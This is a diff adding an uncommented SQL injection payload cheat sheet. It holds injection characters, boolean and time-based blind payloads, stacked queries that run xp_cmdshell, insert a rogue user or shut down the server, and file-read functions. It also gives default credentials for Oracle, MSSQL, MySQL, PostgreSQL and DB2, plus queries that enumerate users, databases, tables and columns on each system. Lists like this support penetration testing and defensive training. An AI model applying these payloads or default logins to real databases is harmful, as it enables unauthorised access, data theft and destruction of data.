@@ -1,0 +1,63 @@
+Single Quote(‘)
+Double Quote(“)
+Hyphens (--)
+Hash(#)
+Comment(/*)
+Semicolon (;)
+CHAR()
+ASCII()
+HEX()
+CONCAT()
+CAST()
+CONVERT()
+NULL
+Union all select NULL (Multiple columns)
+1;exec master..xp_cmdshell ‘dir’>C:\inetpub\wwwroot\dir.txt’ OR master.dbo.xp_cmdshell
+LOAD_FILE(), User UTL_FILE and utfReadfileAsTable
+1’; insert into users values(‘nto’,’nto123’)
+1’;shutdown –
+select name from syscolumns where id =(select id FROM sysobjects where name = ‘target table name’) – (Union can help)Co
+AND 1=1
+AND 1=0
+or 1=1
+or 1=0
+1+AND+USER_NAME()=’dbo’
+1;waitfor+delay+’0:0:10’
+SELECT+ASCII(SUBSTRING((a. loginame),1,1))+FROM+master..sysprocesses+AS+a+WHERE+a.spid+=+@@SPID)=115
+BENCHMARK(TIMES, TASK)
+pg_sleep(10)
+scott/tiger
+dbsnmp/dbsnmp
+mysql/<BLANK>, root/<BLANK>
+postgres/<BLANK>
+sa/<BLANK>
+db2admin/db2admin
+@@version
+FROM master..syslogins
+FROM master..sysobjects WHERE xtype = ‘U’
+FROM master..sysdatabases;
+FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = ‘<TABLENAME’)
+DB_NAME()
+table v$version compare with ‘Oracle%’
+* from dba_users
+table_name from all_tables
+distinct owner from all_tables
+column_name from all_tab_columns where table_name=‘<TABLENAME>
+user from dual
+Versionnumber from sysibm.sysversions;
+user from sysibm.sysdummy1
+name from sysibm.systables
+schemaname from syscat.schemata
+name, tbname, coltype from sysibm.syscolumns
+user from sysibm.sysdummy1
+@@version
+* from mysql.user
+table_schema,table_name FROM information_schema.tables WHERE table_schema != ‘mysql’ AND table_schema != ‘information_schema’
+distinct(db) FROM mysql.db
+table_schema, column_name FROM information_schema.columns WHERE table_schema != ‘mysql’ AND table_schema != ‘information_schema’ AND
+table_name == ‘<TABLENAME>’
+user()
+version()
+* from pg_user
+datname FROM pg_database
+user;
